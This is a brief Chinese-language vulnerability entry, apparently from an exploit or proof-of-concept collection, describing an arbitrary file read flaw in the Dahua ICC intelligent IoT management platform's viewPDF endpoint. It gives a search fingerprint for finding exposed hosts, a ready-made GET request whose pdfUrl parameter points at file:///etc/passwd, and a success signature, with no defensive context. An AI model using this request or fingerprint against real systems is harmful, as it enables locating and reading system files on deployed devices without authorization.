# 大华ICC智能物联管理平台viewPDF任意文件读取漏洞

大华 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="static/qwebchannel.js"`
- **请求**：`GET /evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file:///etc/passwd HTTP/1.1`
- **响应特征**：200